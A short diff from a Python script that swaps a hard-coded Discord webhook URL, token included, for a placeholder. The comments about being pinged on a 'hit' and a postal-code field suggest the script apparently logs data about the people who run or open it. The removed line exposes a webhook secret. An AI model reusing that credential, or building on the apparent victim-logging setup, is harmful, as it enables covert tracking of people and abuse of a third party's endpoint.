@@ -27,7 +27,7 @@ postal=data['postal']
 
 
 # your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/941814802228068403/W-hFHR0KVk8cksKEgj2vbiFQL2Mo3QXGj65t9Y05KwMXYPC0aEpbdzU4AThyD-qHjoAG'
+WEBHOOK_URL = 'WEBHOOK_URL'
 
 # mentions you when you get a hit
 PING_ME = True
